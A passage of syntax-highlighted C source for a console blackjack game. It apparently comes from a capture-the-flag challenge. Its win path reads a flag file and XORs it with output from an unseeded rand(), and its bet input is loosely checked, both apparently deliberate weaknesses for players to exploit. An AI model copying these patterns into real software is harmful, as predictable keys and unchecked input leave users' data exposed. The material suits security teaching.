class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">   <span class="comment">// srand((unsigned) time(NULL)); //Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, heart); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  %d  |\n"</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  J  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  A  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  Q  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  K  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spadecard</span><span class="params">()</span> <span class="comment">//Displays Spade Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">   <span class="comment">// srand((unsigned) time(NULL)); //Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  %d  |\n"</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  J  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  A  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  Q  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  K  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">randcard</span><span class="params">()</span> <span class="comment">//Generates random card</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      </span><br><span class="line">                </span><br><span class="line">    <span class="comment">// srand((unsigned) time(NULL)); //Generates random seed for rand() function</span></span><br><span class="line">     random_card = rand()%<span class="number">4</span>+<span class="number">1</span>;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">1</span>)</span><br><span class="line">     &#123;   </span><br><span class="line">         clubcard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">2</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         diamondcard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">3</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         heartcard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;</span><br><span class="line">          </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">4</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         spadecard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;    </span><br><span class="line">     <span class="keyword">return</span> l;</span><br><span class="line">&#125; <span class="comment">// End Function   </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span> <span class="comment">//Plays game</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">int</span> p=<span class="number">0</span>; <span class="comment">// holds value of player_total</span></span><br><span class="line">     <span class="keyword">int</span> i=<span class="number">1</span>; <span class="comment">// counter for asking user to hold or stay (aka game turns)</span></span><br><span class="line">     <span class="keyword">char</span> choice3;</span><br><span class="line">     player_total=<span class="number">0</span>;</span><br><span class="line">     dealer_total=<span class="number">0</span>;</span><br><span class="line">     cash = cash;</span><br><span class="line">     cash_test();</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nCash: $%d\n"</span>,cash); <span class="comment">//Prints amount of cash user has</span></span><br><span class="line">     randcard(); <span class="comment">//Generates random card</span></span><br><span class="line">     player_total = p + l; <span class="comment">//Computes player total</span></span><br><span class="line">     p = player_total;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nYour Total is %d\n"</span>, p); <span class="comment">//Prints player total</span></span><br><span class="line">     dealer(); <span class="comment">//Computes and prints dealer total</span></span><br><span class="line">     betting(); <span class="comment">//Prompts user to enter bet amount</span></span><br><span class="line">        </span><br><span class="line">     <span class="keyword">while</span>(i&lt;=<span class="number">21</span>) <span class="comment">//While loop used to keep asking user to hit or stay at most twenty-one times</span></span><br><span class="line">                  <span class="comment">//  because there is a chance user can generate twenty-one consecutive 1's</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">if</span>(p==<span class="number">21</span>) <span class="comment">//If user total is 21, win</span></span><br><span class="line">         &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\nUnbelievable! You Win!\n"</span>);</span><br><span class="line">             won = won+<span class="number">1</span>;</span><br><span class="line">             cash = cash+bet;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">             dealer_total=<span class="number">0</span>;</span><br><span class="line">             askover();</span><br><span class="line">         &#125;</span><br><span class="line">      </span><br><span class="line">         <span class="keyword">if</span>(p&gt;<span class="number">21</span>) <span class="comment">//If player total is over 21, loss</span></span><br><span class="line">         &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\nWoah Buddy, You Went WAY over.\n"</span>);</span><br><span class="line">             loss = loss+<span class="number">1</span>;</span><br><span class="line">             cash = cash - bet;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">             dealer_total=<span class="number">0</span>;</span><br><span class="line">             askover();</span><br><span class="line">         &#125;</span><br><span class="line">      </span><br><span class="line">         <span class="keyword">if</span>(p&lt;=<span class="number">21</span>) <span class="comment">//If player total is less than 21, ask to hit or stay</span></span><br><span class="line">         &#123;         </span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\n\nWould You Like to Hit or Stay?"</span>);</span><br><span class="line">              </span><br><span class="line">             <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;choice3);</span><br><span class="line">             <span class="keyword">while</span>((choice3!=<span class="string">'H'</span>) &amp;&amp; (choice3!=<span class="string">'h'</span>) &amp;&amp; (choice3!=<span class="string">'S'</span>) &amp;&amp; (choice3!=<span class="string">'s'</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">             &#123;                                                                           </span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">"Please Enter H to Hit or S to Stay.\n"</span>);</span><br><span class="line">                 <span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;choice3);</span><br><span class="line">             &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">             <span class="keyword">if</span>((choice3==<span class="string">'H'</span>) || (choice3==<span class="string">'h'</span>)) <span class="comment">// If Hit, continues</span></span><br><span class="line">             &#123; </span><br><span class="line">                 randcard();</span><br><span class="line">                 player_total = p + l;</span><br><span class="line">                 p = player_total;</span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">"\nYour Total is %d\n"</span>, p);</span><br><span class="line">                 dealer();</span><br><span class="line">                  <span class="keyword">if</span>(dealer_total==<span class="number">21</span>) <span class="comment">//Is dealer total is 21, loss</span></span><br><span class="line">                  &#123;</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">"\nDealer Has the Better Hand. You Lose.\n"</span>);</span><br><span class="line">                      loss = loss+<span class="number">1</span>;</span><br><span class="line">                      cash = cash - bet;</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">                      dealer_total=<span class="number">0</span>;</span><br><span class="line">                      askover();</span><br><span class="line">                  &#125; </span><br><span class="line">      </span><br><span class="line">                  <span class="keyword">if</span>(dealer_total&gt;<span class="number">21</span>) <span class="comment">//If dealer total is over 21, win</span></span><br><span class="line">                  &#123;                      </span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">"\nDealer Has Went Over!. You Win!\n"</span>);</span><br><span class="line">                      won = won+<span class="number">1</span>;</span><br><span class="line">                      cash = cash+bet;</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">                      dealer_total=<span class="number">0</span>;</span><br><span class="line">                      askover();</span><br><span class="line">                  &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span>((choice3==<span class="string">'S'</span>) || (choice3==<span class="string">'s'</span>)) <span class="comment">// If Stay, does not continue</span></span><br><span class="line">             &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\nYou Have Chosen to Stay at %d. Wise Decision!\n"</span>, player_total);</span><br><span class="line">                stay();</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;</span><br><span class="line">             i++; <span class="comment">//While player total and dealer total are less than 21, re-do while loop </span></span><br><span class="line">     &#125; <span class="comment">// End While Loop</span></span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dealer</span><span class="params">()</span> <span class="comment">//Function to play for dealer AI</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">int</span> z;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(dealer_total&lt;<span class="number">17</span>)</span><br><span class="line">     &#123;</span><br><span class="line">    <span class="comment">//  srand((unsigned) time(NULL) + 1); //Generates random seed for rand() function</span></span><br><span class="line">      z=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span>(z&lt;=<span class="number">10</span>) <span class="comment">//If random number generated is 10 or less, keep that value</span></span><br><span class="line">      &#123;</span><br><span class="line">         d=z;</span><br><span class="line">          </span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(z&gt;<span class="number">11</span>) <span class="comment">//If random number generated is more than 11, change value to 10</span></span><br><span class="line">      &#123;</span><br><span class="line">         d=<span class="number">10</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(z==<span class="number">11</span>) <span class="comment">//If random number is 11(Ace), change value to 11 or 1 depending on dealer total</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span>(dealer_total&lt;=<span class="number">10</span>)</span><br><span class="line">         &#123;</span><br><span class="line">             d=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             d=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">     dealer_total = dealer_total + d;</span><br><span class="line">     &#125;</span><br><span class="line">           </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nThe Dealer Has a Total of %d"</span>, dealer_total); <span class="comment">//Prints dealer total</span></span><br><span class="line">      </span><br><span class="line">&#125; <span class="comment">// End Function </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stay</span><span class="params">()</span> <span class="comment">//Function for when user selects 'Stay'</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     dealer(); <span class="comment">//If stay selected, dealer continues going</span></span><br><span class="line">     <span class="keyword">if</span>(dealer_total&gt;=<span class="number">17</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="keyword">if</span>(player_total&gt;=dealer_total) <span class="comment">//If player's total is more than dealer's total, win</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nUnbelievable! You Win!\n"</span>);</span><br><span class="line">         won = won+<span class="number">1</span>;</span><br><span class="line">         cash = cash+bet;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">         dealer_total=<span class="number">0</span>;</span><br><span class="line">         askover();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(dealer_total&gt;<span class="number">21</span>) <span class="comment">//If dealer's total is more than 21, win</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nUnbelievable! You Win!\n"</span>);</span><br><span class="line">         won = won+<span class="number">1</span>;</span><br><span class="line">         cash = cash+bet;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">         dealer_total=<span class="number">0</span>;</span><br><span class="line">         askover();</span><br><span class="line">      &#125;      </span><br><span class="line">      <span class="keyword">if</span>(player_total&lt;dealer_total) <span class="comment">//If player's total is less than dealer's total, loss</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nDealer Has the Better Hand. You Lose.\n"</span>);</span><br><span class="line">         loss = loss+<span class="number">1</span>;</span><br><span class="line">         cash = cash - bet;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">         dealer_total=<span class="number">0</span>;</span><br><span class="line">         askover();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         stay();</span><br><span class="line">     &#125;</span><br><span class="line">      </span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cash_test</span><span class="params">()</span> <span class="comment">//Test for if user has cash remaining in purse</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (cash &lt;= <span class="number">0</span>) <span class="comment">//Once user has zero remaining cash, game ends and prompts user to play again</span></span><br><span class="line">     &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You Are Bankrupt. Game Over"</span>);</span><br><span class="line">        <span class="comment">//cash = 500;</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">//askover();</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span>(cash&gt;=WIN_SUM)&#123;</span><br><span class="line">     	<span class="keyword">int</span> id;</span><br><span class="line">     	<span class="keyword">int</span> length;</span><br><span class="line">     	<span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">     	<span class="keyword">char</span> *key=<span class="number">0</span>;</span><br><span class="line">     	id = open(<span class="string">"/home/tsctf/flag/flag"</span>,O_RDONLY,S_IRUSR );</span><br><span class="line">     	<span class="keyword">if</span>(id &lt;<span class="number">0</span>)&#123;</span><br><span class="line">     		<span class="built_in">printf</span>(<span class="string">"flag file error~!\n"</span>);</span><br><span class="line">     		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     	&#125;</span><br><span class="line">     	length = read(id,buffer,<span class="number">100</span>);</span><br><span class="line">     	<span class="keyword">if</span> (length&lt;<span class="number">0</span>)&#123;</span><br><span class="line">     		<span class="built_in">printf</span>(<span class="string">"read error~!\n"</span>);</span><br><span class="line">     		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     	&#125;</span><br><span class="line">     	buffer[length] = <span class="string">'\0'</span>;</span><br><span class="line">     	length = <span class="built_in">strlen</span>(buffer);</span><br><span class="line">     	key = <span class="built_in">malloc</span>(length);</span><br><span class="line">     	<span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ; i&lt;length;i++)&#123;</span><br><span class="line">     		<span class="comment">//printf("%d ",key[i*4]);</span></span><br><span class="line">     		key[i]=(rand()%<span class="number">256</span>);</span><br><span class="line">     	&#125;</span><br><span class="line">     	<span class="comment">//printf("%d",(length/4)*4);</span></span><br><span class="line">     	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">     		<span class="comment">//printf("%2x",key[i]);</span></span><br><span class="line">     		buffer[i] = buffer[i]^key[i];</span><br><span class="line">     	&#125;</span><br><span class="line">     	<span class="built_in">puts</span>(<span class="string">"d(`･∀･)b	:"</span>);</span><br><span class="line">     	<span class="built_in">puts</span>(<span class="string">"		OK, you win,"</span>);</span><br><span class="line">     	<span class="built_in">puts</span>(<span class="string">"I won't give u real flag :"</span>);</span><br><span class="line">        write(<span class="number">1</span>,buffer,length);</span><br><span class="line">     	close(id);</span><br><span class="line">     	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span> <span class="comment">//Asks user amount to bet</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"\n\nEnter Bet: $"</span>);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%u"</span>, &amp;bet);</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">while</span> ((bet &gt; cash) || (bet == <span class="number">0</span>))<span class="comment">//If player tries to bet more money than player has</span></span><br><span class="line"> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nAre you kidding me? "</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nEnter Bet: "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%u"</span>, &amp;bet);</span><br><span class="line">        <span class="comment">//return bet;</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">return</span> bet;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">askover</span><span class="params">()</span> <span class="comment">// Function for asking player if they want to play again</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> choice1;</span><br><span class="line">         </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nWould You Like To Play Again?"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nPlease Enter Y for Yes or N for No\n"</span>);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">"\n%c"</span>,&amp;choice1);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span>((choice1!=<span class="string">'Y'</span>) &amp;&amp; (choice1!=<span class="string">'y'</span>) &amp;&amp; (choice1!=<span class="string">'N'</span>) &amp;&amp; (choice1!=<span class="string">'n'</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">    &#123;                                                                           </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;choice1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((choice1 == <span class="string">'Y'</span>) || (choice1 == <span class="string">'y'</span>)) <span class="comment">// If yes, continue.</span></span><br><span class="line">    &#123; </span><br><span class="line">          <span class="comment">//  system("clear");</span></span><br><span class="line">            play();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((choice1 == <span class="string">'N'</span>) || (choice1 == <span class="string">'n'</span>)) <span class="comment">// If no, exit program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//fileresults();</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nBYE!!!!\n\n"</span>);</span><br><span class="line">        <span class="comment">//system("pause");</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fileresults</span><span class="params">()</span> <span class="comment">//Prints results into Blackjack.txt file in program directory</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fpresults; <span class="comment">//File pointer is fpresults</span></span><br><span class="line">    fpresults = fopen(RESULTS, <span class="string">"w"</span>); <span class="comment">//Creates file and writes into it</span></span><br><span class="line">    <span class="keyword">if</span>(fpresults == <span class="literal">NULL</span>) <span class="comment">// what to do if file missing from directory</span></span><br><span class="line">    &#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">"\nError: File Missing\n"</span>);</span><br><span class="line">               <span class="comment">//system("pause");</span></span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;     </span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">"\n\t RESULTS"</span>);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">"\n\t---------\n"</span>);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">"\nYou Have Won %d Times\n"</span>, won);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">"\nYou Have Lost %d Times\n"</span>, loss);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">"\nKeep Playing and Set an All-Time Record!"</span>);</span><br><span class="line">    &#125; </span><br><span class="line">     fclose(fpresults);</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handler</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"[-] Time out ... \n"</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *logo =</span><br><span class="line">	<span 